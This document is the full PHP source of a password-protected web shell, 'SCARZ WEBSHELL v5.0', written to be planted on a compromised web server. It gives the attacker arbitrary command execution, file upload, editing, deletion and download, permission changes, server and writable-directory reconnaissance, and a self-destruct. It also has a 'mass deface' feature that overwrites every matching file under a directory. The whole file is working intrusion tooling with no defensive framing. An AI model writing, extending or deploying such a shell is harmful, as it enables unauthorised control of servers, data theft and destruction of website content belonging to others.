<?php
// SCARZ WEBSHELL v5.0 - WELCOME TO UTOPIA
session_start();
$password = "DCA2024"; 

if (isset($_POST['pass'])) {
    if ($_POST['pass'] === $password) {
        $_SESSION['auth'] = true;
    } else {
        $error = "WRONG PASSWORD!";
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: ".$_SERVER['PHP_SELF']);
    exit;
}

if (!isset($_SESSION['auth'])) {
    ?>
    <style>
        @keyframes rainbow {
            0% { color: #ff0000; }
            14% { color: #ff7f00; }
            28% { color: #ffff00; }
            42% { color: #00ff00; }
            57% { color: #0000ff; }
            71% { color: #4b0082; }
            85% { color: #9400d3; }
            100% { color: #ff0000; }
        }
        body {
            background: radial-gradient(circle at center, #000000 0%, #111111 100%);
            color: white;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        form {
            background: rgba(0, 0, 0, 0.7);
            padding: 30px;
            border: 2px solid;
            border-image: linear-gradient(45deg, #ff0000, #ff7f00, #ffff00, #00ff00, #0000ff, #4b0082, #9400d3) 1;
            border-radius: 10px;
            text-align: center;
            width: 300px;
            box-shadow: 0 0 20px rgba(255,255,255,0.1);
        }
        input[type="password"] {
            width: 90%;
            padding: 10px;
            font-weight: bold;
            text-transform: uppercase;
            font-size: 16px;
            margin-bottom: 20px;
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid;
            border-image: linear-gradient(45deg, #ff0000, #ff7f00, #ffff00) 1;
            color: white;
        }
        input[type="submit"] {
            background: linear-gradient(45deg, #ff0000, #ff7f00, #ffff00);
            color: black;
            font-weight: bold;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-size: 16px;
            text-transform: uppercase;
        }
        .error {
            color: #ff5555;
            font-weight: bold;
            margin-bottom: 15px;
            text-transform: uppercase;
        }
        .logo {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 20px;
            animation: rainbow 5s linear infinite;
            text-shadow: 0 0 10px currentColor;
        }
    </style>
    <form method="POST">
        <div class="logo">SCARZ WEBSHELL</div>
        <?php if(isset($error)) echo "<div class='error'>$error</div>"; ?>
        <input type="password" name="pass" placeholder="PASSWORD" autofocus autocomplete="off" required />
        <br/>
        <input type="submit" value="LOGIN" />
    </form>
    <?php
    exit;
}

$scriptPath = dirname(realpath(__FILE__));

if (isset($_GET['path']) && !empty($_GET['path'])) {
    $requestedPath = $_GET['path'];
    if ($requestedPath[0] !== '/') {
        $currentPath = isset($_SESSION['current_path']) ? $_SESSION['current_path'] : $scriptPath;
        $requestedPath = realpath($currentPath.'/'.$requestedPath);
    } else {
        $requestedPath = realpath($requestedPath);
    }
    
    if ($requestedPath && is_dir($requestedPath) && is_readable($requestedPath)) {
        $_SESSION['current_path'] = $requestedPath;
        $path = $requestedPath;
    } else {
        $path = isset($_SESSION['current_path']) ? $_SESSION['current_path'] : $scriptPath;
        $msg = "INVALID PATH OR ACCESS DENIED: ".htmlspecialchars($_GET['path']);
    }
} else {
    $path = isset($_SESSION['current_path']) ? $_SESSION['current_path'] : $scriptPath;
}

function exec_cmd($cmd) {
    if (stripos(PHP_OS, 'win') === 0) {
        return shell_exec($cmd . " 2>&1");
    } else {
        return shell_exec($cmd . " 2>&1");
    }
}

if (isset($_FILES['upload'])) {
    $uploadfile = $path . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $uploadfile)) {
        $msg = "UPLOAD SUCCESSFUL";
    } else {
        $msg = "UPLOAD FAILED";
    }
}

if (isset($_GET['delete'])) {
    $fileToDelete = realpath($_GET['delete']);
    if ($fileToDelete && strpos($fileToDelete, $path) === 0 && is_file($fileToDelete)) {
        unlink($fileToDelete);
        header("Location: ".$_SERVER['PHP_SELF']."?path=".urlencode($path));
        exit;
    }
}

if (isset($_GET['download'])) {
    $fileToDownload = realpath($_GET['download']);
    if ($fileToDownload && strpos($fileToDownload, $path) === 0 && is_file($fileToDownload)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($fileToDownload).'"');
        header('Content-Length: ' . filesize($fileToDownload));
        readfile($fileToDownload);
        exit;
    }
}

if (isset($_POST['editfile']) && isset($_POST['filecontent'])) {
    $editFilePath = realpath($_POST['editfile']);
    if ($editFilePath && strpos($editFilePath, $path) === 0 && is_writable($editFilePath)) {
        file_put_contents($editFilePath, $_POST['filecontent']);
        $msg = "FILE SAVED SUCCESSFULLY";
    } else {
        $msg = "FAILED TO SAVE FILE";
    }
}

if (isset($_GET['selfdestruct']) && $_GET['selfdestruct'] === 'true') {
    unlink(__FILE__);
    exit("SCARZ WEBSHELL DELETED.");
}

if (isset($_POST['chmodfile']) && isset($_POST['chmodperm'])) {
    $cf = realpath($path . DIRECTORY_SEPARATOR . $_POST['chmodfile']);
    if ($cf && strpos($cf, $path) === 0) {
        if (@chmod($cf, octdec($_POST['chmodperm']))) {
            $msg = "PERMISSIONS CHANGED SUCCESSFULLY";
        } else {
            $msg = "FAILED TO CHANGE PERMISSIONS";
        }
    } else {
        $msg = "FILE/DIR NOT FOUND OR ACCESS DENIED";
    }
}

if (isset($_POST['newfilename'])) {
    $newFile = $path . DIRECTORY_SEPARATOR . $_POST['newfilename'];
    if (!file_exists($newFile)) {
        if (touch($newFile)) {
            $msg = "FILE CREATED SUCCESSFULLY";
        } else {
            $msg = "FAILED TO CREATE FILE";
        }
    } else {
        $msg = "FILE ALREADY EXISTS";
    }
}

if (isset($_POST['newfoldername'])) {
    $newFolder = $path . DIRECTORY_SEPARATOR . $_POST['newfoldername'];
    if (!file_exists($newFolder)) {
        if (mkdir($newFolder)) {
            $msg = "FOLDER CREATED SUCCESSFULLY";
        } else {
            $msg = "FAILED TO CREATE FOLDER";
        }
    } else {
        $msg = "FOLDER ALREADY EXISTS";
    }
}

if (isset($_POST['renameold']) && isset($_POST['renamenew'])) {
    $oldPath = $path . DIRECTORY_SEPARATOR . $_POST['renameold'];
    $newPath = $path . DIRECTORY_SEPARATOR . $_POST['renamenew'];
    if (file_exists($oldPath) && !file_exists($newPath)) {
        if (rename($oldPath, $newPath)) {
            $msg = "RENAME SUCCESSFUL";
        } else {
            $msg = "RENAME FAILED";
        }
    } else {
        $msg = "FILE NOT FOUND OR NEW NAME ALREADY EXISTS";
    }
}

if (isset($_POST['searchterm'])) {
    $searchTerm = $_POST['searchterm'];
    $searchResults = [];
    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path));
    foreach ($iterator as $file) {
        if ($file->isDir()) continue;
        if (stripos($file->getFilename(), $searchTerm) !== false) {
            $searchResults[] = $file->getPathname();
        }
    }
}

// MASS DEFACE FUNCTIONALITY - ADDED FEATURE
if (isset($_POST['mass_deface']) && isset($_FILES['deface_file'])) {
    $defaceContent = file_get_contents($_FILES['deface_file']['tmp_name']);
    $startDir = isset($_POST['deface_start_dir']) ? $_POST['deface_start_dir'] : $path;
    $fileExtension = isset($_POST['deface_ext']) ? $_POST['deface_ext'] : 'php';
    
    if (realpath($startDir)) {
        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($startDir));
        $successCount = 0;
        $failCount = 0;
        
        foreach ($iterator as $file) {
            if ($file->isDir()) continue;
            if ($fileExtension && $file->getExtension() !== $fileExtension) continue;
            
            if (@file_put_contents($file->getPathname(), $defaceContent) !== false) {
                $successCount++;
            } else {
                $failCount++;
            }
        }
        
        $msg = "MASS DEFACE COMPLETE: $successCount files defaced, $failCount failed";
    } else {
        $msg = "INVALID START DIRECTORY FOR MASS DEFACE";
    }
}

$files = scandir($path);

function human_filesize($bytes, $decimals = 2) {
    $sizes = array('B','KB','MB','GB','TB');
    $factor = floor((strlen($bytes) - 1) / 3);
    return sprintf("%.{$decimals}f", $bytes / pow(1024, $factor)) . @$sizes[$factor];
}

$serverInfo = [
    'OS' => php_uname(),
    'PHP Version' => phpversion(),
    'Server IP' => $_SERVER['SERVER_ADDR'],
    'Client IP' => $_SERVER['REMOTE_ADDR'],
    'Server Software' => $_SERVER['SERVER_SOFTWARE'],
    'Current User' => get_current_user(),
    'Disk Usage' => disk_free_space($path) . ' free of ' . disk_total_space($path),
    'Current Path' => $path
];

$writableDirs = [];
$checkDirs = ['/', '/tmp', '/var/www', $path, '/home'];
foreach ($checkDirs as $dir) {
    if (is_dir($dir) && is_writable($dir)) {
        $writableDirs[] = $dir;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>SCARZ WEBSHELL v5.0 - RAINBOW EDITION</title>
<style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap');
    @keyframes rainbow {
        0% { color: #ff0000; }
        14% { color: #ff7f00; }
        28% { color: #ffff00; }
        42% { color: #00ff00; }
        57% { color: #0000ff; }
        71% { color: #4b0082; }
        85% { color: #9400d3; }
        100% { color: #ff0000; }
    }
    @keyframes rainbow-bg {
        0% { background-color: #ff0000; }
        14% { background-color: #ff7f00; }
        28% { background-color: #ffff00; }
        42% { background-color: #00ff00; }
        57% { background-color: #0000ff; }
        71% { background-color: #4b0082; }
        85% { background-color: #9400d3; }
        100% { background-color: #ff0000; }
    }
    @keyframes rainbow-border {
        0% { border-color: #ff0000; }
        14% { border-color: #ff7f00; }
        28% { border-color: #ffff00; }
        42% { border-color: #00ff00; }
        57% { border-color: #0000ff; }
        71% { border-color: #4b0082; }
        85% { border-color: #9400d3; }
        100% { border-color: #ff0000; }
    }
    @keyframes rainbow-glow {
        0% { box-shadow: 0 0 10px #ff0000; }
        14% { box-shadow: 0 0 10px #ff7f00; }
        28% { box-shadow: 0 0 10px #ffff00; }
        42% { box-shadow: 0 0 10px #00ff00; }
        57% { box-shadow: 0 0 10px #0000ff; }
        71% { box-shadow: 0 0 10px #4b0082; }
        85% { box-shadow: 0 0 10px #9400d3; }
        100% { box-shadow: 0 0 10px #ff0000; }
    }
    body {
        margin:0; padding:0; background: #111;
        font-family: 'Orbitron', monospace;
        color: white;
        user-select:none;
    }
    h1, h2, h3 {
        text-transform: uppercase;
        letter-spacing: 2px;
        text-align:center;
        margin: 10px 0;
        animation: rainbow 5s linear infinite;
        text-shadow: 0 0 5px currentColor;
    }
    .container {
        max-width: 1100px;
        margin: 0 auto;
        padding: 15px;
    }
    .msg {
        background: rgba(0,0,0,0.7);
        padding: 10px;
        margin: 10px 0;
        border-left: 3px solid;
        animation: rainbow-border 5s linear infinite;
        text-align: center;
        font-weight: bold;
        text-transform: uppercase;
    }
    a {
        color: white;
        text-decoration: none;
        transition: all 0.3s;
    }
    a:hover {
        text-decoration: underline;
        animation: rainbow 5s linear infinite;
    }
    table {
        width: 100%;
        border-collapse: collapse;
        margin-top: 15px;
        animation: rainbow-glow 5s linear infinite;
    }
    th, td {
        border: 1px solid;
        animation: rainbow-border 5s linear infinite;
        padding: 8px 12px;
        text-transform: uppercase;
        font-size: 13px;
        text-align: left;
    }
    th {
        background: rgba(0,0,0,0.7);
        color: white;
    }
    tr:nth-child(even) {
        background: rgba(0,0,0,0.3);
    }
    input[type=text], textarea {
        width: 100%;
        background: rgba(0,0,0,0.7);
        border: 1px solid;
        animation: rainbow-border 5s linear infinite;
        color: white;
        text-transform: uppercase;
        font-family: 'Orbitron', monospace;
        font-weight: bold;
        font-size: 14px;
        padding: 8px;
        resize: vertical;
    }
    textarea {
        height: 250px;
    }
    input[type=submit], button {
        background: linear-gradient(45deg, #ff0000, #ff7f00, #ffff00, #00ff00, #0000ff, #4b0082, #9400d3);
        background-size: 600% 600%;
        animation: rainbow-bg 5s linear infinite;
        border: none;
        color: black;
        font-weight: bold;
        padding: 10px 20px;
        margin: 5px 0;
        cursor: pointer;
        text-transform: uppercase;
        font-size: 15px;
        border-radius: 3px;
    }
    input[type=submit]:hover, button:hover {
        animation: rainbow-bg 2s linear infinite;
    }
    .header, .footer {
        background: rgba(0,0,0,0.7);
        padding: 10px;
        text-align: center;
        font-weight: 700;
        font-size: 18px;
        animation: rainbow 5s linear infinite;
        text-shadow: 0 0 10px currentColor;
        letter-spacing: 3px;
        border-bottom: 1px solid;
        animation: rainbow-border 5s linear infinite;
    }
    .path {
        background: rgba(0,0,0,0.5);
        padding: 8px;
        margin-bottom: 10px;
        border: 1px solid;
        animation: rainbow-border 5s linear infinite;
        font-weight: bold;
        letter-spacing: 1px;
    }
    .features {
        margin-top: 25px;
    }
    .feature-box {
        background: rgba(0,0,0,0.5);
        padding: 15px;
        margin-bottom: 25px;
        border: 1px solid;
        animation: rainbow-border 5s linear infinite;
        box-shadow: 0 0 10px;
        animation: rainbow-glow 5s linear infinite;
    }
    .nav-links {
        margin-bottom: 20px;
        text-align: center;
    }
    .nav-links a {
        margin: 0 15px;
        font-weight: bold;
        font-size: 14px;
    }
    .btn-danger {
        background: #7f0000;
        animation: none;
    }
    .btn-danger:hover {
        background: #b30000;
        animation: none;
    }
    .path-input {
        width: 70% !important;
        display: inline-block;
    }
    .path-submit {
        width: 25% !important;
        display: inline-block;
    }
    .search-results {
        max-height: 200px;
        overflow-y: auto;
        border: 1px solid;
        animation: rainbow-border 5s linear infinite;
        padding: 10px;
        margin-top: 10px;
        background: rgba(0,0,0,0.3);
    }
    .quick-nav {
        margin-top: 10px;
        padding: 8px;
        background: rgba(0,0,0,0.3);
        border: 1px solid;
        animation: rainbow-border 5s linear infinite;
    }
    .quick-nav a {
        margin: 0 8px;
        font-size: 12px;
    }
    pre {
        background: rgba(0,0,0,0.3);
        padding: 10px;
        border: 1px solid;
        animation: rainbow-border 5s linear infinite;
        color: white;
        font-family: 'Courier New', monospace;
        overflow-x: auto;
    }
    .logo-big {
        font-size: 36px;
        font-weight: bold;
        text-align: center;
        margin: 20px 0;
        animation: rainbow 5s linear infinite;
        text-shadow: 0 0 15px currentColor;
    }
    .rainbow-text {
        animation: rainbow 5s linear infinite;
    }
</style>
</head>
<body>

<div class="header">
    <div class="logo-big">SCARZ WEBSHELL v5.0</div>
    <div>WELCOME TO UTOPIA</div>
</div>

<div class="container">

    <?php if(isset($msg)) echo "<div class='msg'>$msg</div>"; ?>

    <div class="feature-box">
        <h2>CURRENT PATH</h2>
        <form method="GET">
            <input type="text" class="path-input" name="path" value="<?php echo htmlspecialchars($path); ?>" />
            <input type="submit" class="path-submit" value="GO" />
        </form>
        <div class="quick-nav">
            <strong class="rainbow-text">QUICK NAV:</strong>
            <a href="?path=/">ROOT</a> | 
            <a href="?path=/home">HOME</a> | 
            <a href="?path=/var/www">WWW</a> | 
            <a href="?path=/tmp">TEMP</a> |
            <a href="?path=<?php echo urlencode($scriptPath); ?>">SCRIPT</a>
        </div>
    </div>

    <div class="nav-links">
        <a href="?logout=1">LOGOUT</a> |
        <a href="?path=<?php echo urlencode($scriptPath); ?>">HOME</a> |
        <a href="?selfdestruct=true" onclick="return confirm('ARE YOU SURE TO SELF DESTRUCT? THIS WILL DELETE THE SHELL!');" class="btn-danger">SELF DESTRUCT</a>
    </div>

    <div class="feature-box">
        <h2>FILE BROWSER</h2>
        <table>
            <thead>
                <tr>
                    <th>NAME</th>
                    <th>SIZE</th>
                    <th>PERMISSIONS</th>
                    <th>MODIFIED</th>
                    <th>ACTIONS</th>
                </tr>
            </thead>
            <tbody>
            <?php
            foreach ($files as $file) {
                if ($file === '.') continue;
                $fullPath = $path . DIRECTORY_SEPARATOR . $file;
                $isDir = is_dir($fullPath);
                $size = $isDir ? '-' : human_filesize(filesize($fullPath));
                $perms = substr(sprintf('%o', fileperms($fullPath)), -4);
                $modified = date("Y-m-d H:i:s", filemtime($fullPath));
                
                echo "<tr>";
                if ($file === '..') {
                    $parent = dirname($path);
                    echo "<td><a href='?path=".urlencode($parent)."'><strong>.. (PARENT)</strong></a></td>";
                } else {
                    if ($isDir) {
                        echo "<td><a href='?path=".urlencode($fullPath)."'><strong>$file/</strong></a></td>";
                    } else {
                        echo "<td>$file</td>";
                    }
                }
                echo "<td>$size</td>";
                echo "<td>$perms</td>";
                echo "<td>$modified</td>";
                echo "<td>";
                if ($file !== '..' && !$isDir) {
                    echo "<a href='?download=".urlencode($fullPath)."&path=".urlencode($path)."'>DOWNLOAD</a> | ";
                    echo "<a href='?edit=".urlencode($fullPath)."&path=".urlencode($path)."'>EDIT</a> | ";
                }
                if ($file !== '..') {
                    echo "<a href='?delete=".urlencode($fullPath)."&path=".urlencode($path)."' onclick='return confirm(\"DELETE $file ?\");' class='btn-danger'>DELETE</a>";
                }
                echo "</td>";
                echo "</tr>";
            }
            ?>
            </tbody>
        </table>
    </div>

    <div class="feature-box">
        <h2>FILE OPERATIONS</h2>
        
        <h3>UPLOAD FILE</h3>
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="upload" required />
            <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>" />
            <input type="submit" value="UPLOAD" />
        </form>
        
        <h3>CREATE NEW FILE</h3>
        <form method="POST">
            <input type="text" name="newfilename" placeholder="FILENAME" required />
            <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>" />
            <input type="submit" value="CREATE FILE" />
        </form>
        
        <h3>CREATE NEW FOLDER</h3>
        <form method="POST">
            <input type="text" name="newfoldername" placeholder="FOLDER NAME" required />
            <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>" />
            <input type="submit" value="CREATE FOLDER" />
        </form>
        
        <h3>RENAME FILE/FOLDER</h3>
        <form method="POST">
            <input type="text" name="renameold" placeholder="CURRENT NAME" required />
            <input type="text" name="renamenew" placeholder="NEW NAME" required />
            <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>" />
            <input type="submit" value="RENAME" />
        </form>
    </div>

    <!-- MASS DEFACE FEATURE - ADDED SECTION -->
    <div class="feature-box">
        <h2>MASS DEFACE</h2>
        <form method="POST" enctype="multipart/form-data">
            <h3>DEFACE FILE TO UPLOAD</h3>
            <input type="file" name="deface_file" required />
            
            <h3>START DIRECTORY</h3>
            <input type="text" name="deface_start_dir" value="<?php echo htmlspecialchars($path); ?>" placeholder="Where to start defacing from" />
            
            <h3>FILE EXTENSION TO TARGET (leave blank for all files)</h3>
            <input type="text" name="deface_ext" placeholder="php, html, etc" />
            
            <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>" />
            <input type="submit" name="mass_deface" value="EXECUTE MASS DEFACE" class="btn-danger" onclick="return confirm('WARNING: This will overwrite all files with your deface content. Continue?');" />
        </form>
    </div>

    <div class="feature-box">
        <h2>SEARCH FILES</h2>
        <form method="POST">
            <input type="text" name="searchterm" placeholder="SEARCH TERM" required />
            <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>" />
            <input type="submit" value="SEARCH" />
        </form>
        <?php if(isset($searchResults)): ?>
            <div class="search-results">
                <h3>SEARCH RESULTS</h3>
                <?php if(empty($searchResults)): ?>
                    <p>NO FILES FOUND</p>
                <?php else: ?>
                    <ul>
                        <?php foreach($searchResults as $result): ?>
                            <li><?php echo htmlspecialchars($result); ?></li>
                        <?php endforeach; ?>
                    </ul>
                <?php endif; ?>
            </div>
        <?php endif; ?>
    </div>

<?php
if (isset($_GET['edit'])) {
    $editFile = realpath($_GET['edit']);
    if ($editFile && strpos($editFile, $path) === 0 && is_file($editFile) && is_readable($editFile)) {
        $content = htmlspecialchars(file_get_contents($editFile));
        ?>
        <div class="feature-box">
            <h2>EDIT FILE: <?php echo basename($editFile); ?></h2>
            <form method="POST">
                <textarea name="filecontent"><?php echo $content; ?></textarea>
                <input type="hidden" name="editfile" value="<?php echo htmlspecialchars($editFile); ?>" />
                <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>" />
                <input type="submit" value="SAVE FILE" />
            </form>
        </div>
        <?php
    } else {
        echo "<div class='msg'>FAILED TO OPEN FILE FOR EDITING</div>";
    }
}
?>

    <div class="feature-box">
        <h2>CHANGE FILE PERMISSIONS (CHMOD)</h2>
        <form method="POST">
            <input type="text" name="chmodfile" placeholder="FILENAME" required />
            <input type="text" name="chmodperm" placeholder="PERMISSIONS (e.g. 0755)" required />
            <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>" />
            <input type="submit" value="CHANGE PERMISSIONS" />
        </form>
    </div>

    <div class="feature-box">
        <h2>EXECUTE COMMAND</h2>
        <form method="POST">
            <input type="text" name="cmd" placeholder="COMMAND" style="width:90%" required />
            <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>" />
            <input type="submit" value="EXECUTE" />
        </form>
        <pre><?php
if (isset($_POST['cmd'])) {
    echo htmlspecialchars(exec_cmd($_POST['cmd']));
}
?></pre>
    </div>

    <div class="feature-box">
        <h2>PHP INFO</h2>
        <form method="POST">
            <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>" />
            <input type="submit" name="phpinfo" value="SHOW PHP INFO" />
        </form>
        <div style="background:rgba(0,0,0,0.3); padding:10px; margin-top:10px; max-height:300px; overflow:auto;">
        <?php
        if (isset($_POST['phpinfo'])) {
            ob_start();
            phpinfo();
            $phpinfo = ob_get_clean();
            echo preg_replace('/<style.*?<\/style>/s', '', $phpinfo);
        }
        ?>
        </div>
    </div>

    <div class="feature-box">
        <h2>SYSTEM INFORMATION</h2>
        <table>
            <?php foreach($serverInfo as $key => $value): ?>
                <tr>
                    <th><?php echo $key; ?></th>
                    <td><?php echo htmlspecialchars($value); ?></td>
                </tr>
            <?php endforeach; ?>
        </table>
    </div>

    <div class="feature-box">
        <h2>WRITABLE DIRECTORIES</h2>
        <?php if(empty($writableDirs)): ?>
            <p>NO WRITABLE DIRECTORIES FOUND</p>
        <?php else: ?>
            <ul>
                <?php foreach($writableDirs as $dir): ?>
                    <li><?php echo htmlspecialchars($dir); ?></li>
                <?php endforeach; ?>
            </ul>
        <?php endif; ?>
    </div>

    <div class="feature-box">
        <h2>DISK USAGE</h2>
        <pre><?php echo htmlspecialchars(exec_cmd("df -h")); ?></pre>
    </div>

</div>

<div class="footer">SCARZ WEBSHELL v5.0 - WELCOME TO UTOPIA</div>

</body>
</html>